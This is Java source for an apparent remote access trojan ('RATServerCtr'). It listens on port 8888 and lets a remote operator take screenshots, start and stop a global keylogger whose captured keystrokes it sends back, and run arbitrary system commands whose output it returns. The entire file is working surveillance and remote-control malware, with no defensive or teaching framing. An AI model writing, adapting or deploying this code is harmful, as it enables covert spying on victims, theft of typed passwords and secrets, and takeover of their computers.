package controllers;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import javax.imageio.ImageIO;
import views.RATServerView;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

public class RATServerCtr {
    private int port;
    //private String host;
    private ServerSocket myServer;
    private ArrayList<Socket> list;
    private static Socket s;
    public static ArrayList<Integer> key = new ArrayList<>();
    public static GlobalKeyboardHook keyHook;

    public RATServerCtr() {
        port = 8888;
        //host = "localhost";
        list = new ArrayList<>();
        openSocket();
        while(true) {
            try {
                s = myServer.accept();
                list.add(s);
                execute(s);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    public void sendResult(String res) {
        try {
            DataOutputStream dout = new DataOutputStream(list.get(list.size()-1).getOutputStream());
            dout.writeUTF(res);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void execute (Socket s) {
        try {
            sendResult("ok");
            String mode = getInput();
            new RATServerView().showMessage(mode);
            switch (mode) {
                case "Pic":
                    sendResult("ok");
                    sendPic();
                    break;
                case "Key":
                    sendResult("ok");
                    //sendKeys();
                    keyHook = getKeyStrokeOn(key);
                    break;
                case "Get":
                    if(keyHook.isAlive()) {
                        sendResult("ok");
                        sendKeys(key);
                        key.clear();
                        break;
                    }else {
                        sendResult("no");
                        sendKeys(key);
                        break;
                    }
                case "Drop":
                    sendResult("ok");
                    keyHook.shutdownHook();
                    key.clear();
                    break;
                default:
                    commandHandler(mode); //hand and send res
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void openSocket() {
        try {
            myServer = new ServerSocket(port);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public String getInput() throws IOException {
        InputStream ips = s.getInputStream();
        DataInputStream dis = new DataInputStream(ips);
        String input = dis.readUTF();
        return input;
    }
    
    public void sendPic() throws IOException {
        try {
            DataOutputStream dout = new DataOutputStream(s.getOutputStream());
            BufferedImage screencap = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(screencap,"jpg",baos);
            
            int size = baos.size();
            dout.writeInt(size);
            dout.write(baos.toByteArray());
            dout.flush();
        }catch(Exception e) {
            e.printStackTrace();
        }
    }
    
    public void commandHandler(String command) throws IOException {
        String c = command;
        try {
            Process proc = Runtime.getRuntime().exec(c);
            BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader error = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String line = "";
            if(error.readLine() != null) {
                sendResult("no");
                System.out.println("Error!");
            }else {
                sendResult("ok");
                ArrayList<String> lines = new ArrayList<>();
                while((line = input.readLine()) != null) {
                    lines.add(line);   
                }
      
                DataOutputStream dout = new DataOutputStream(s.getOutputStream());

                dout.writeInt(lines.size());

                for(String lineTemp : lines) {
                    dout.writeUTF(lineTemp);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void sendKeys(ArrayList<Integer> keys) {
        try {
            DataOutputStream dout = new DataOutputStream(s.getOutputStream());
            dout.writeInt(keys.size());
            for(int keyTemp : keys) {
                dout.writeInt(keyTemp);
                System.out.println(keyTemp);
            }
            dout.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static GlobalKeyboardHook getKeyStrokeOn(ArrayList<Integer> listKeypress) {
        try {
            GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
            
            keyboardHook.addKeyListener(new GlobalKeyAdapter() {
                @Override
                public void keyPressed(GlobalKeyEvent event) {
                    listKeypress.add(event.getVirtualKeyCode());
                }
            });
            
            return keyboardHook;
        } catch (Exception e) {
            e.printStackTrace();
            
            return null;
        }
    }
}
